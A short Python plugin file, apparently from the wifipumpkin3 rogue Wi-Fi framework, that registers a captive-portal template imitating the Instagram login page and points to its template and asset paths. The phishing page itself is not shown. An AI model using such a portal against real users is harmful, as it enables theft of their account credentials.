# content file: instagram.py
from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C

class Instagram(CaptiveTemplatePlugin):
    Name = "instagram"
    Version = "1.0"
    Description = "Template for instagram page login"
    Author = "Dr.rootsu"
    TemplatePath = C.TEMPLATES_FLASK + "templates/instagram"
    StaticPath = C.TEMPLATES_FLASK + "templates/instagram/static"
    Preview = C.TEMPLATES_FLASK + "templates/instagram/preview.png"